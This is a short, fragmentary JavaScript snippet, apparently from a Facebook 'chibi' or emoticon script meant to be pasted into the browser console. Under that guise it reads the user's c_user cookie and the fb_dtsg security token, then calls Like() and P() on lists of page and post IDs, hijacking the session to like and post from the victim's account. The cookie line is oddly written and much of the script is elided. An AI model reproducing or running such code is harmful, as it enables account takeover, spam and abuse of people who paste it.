...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/tangbangtroi009" target="_blank"><br>Facebook Chibi</a>';
	html += '</div>';
...
Like("199838936762897");Like("215884811819360");Like("287292231428300");Like("420114618009389");Like("409181862442344");
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
...
P("293686840788839");P("293348724155984");P("291328617691328");
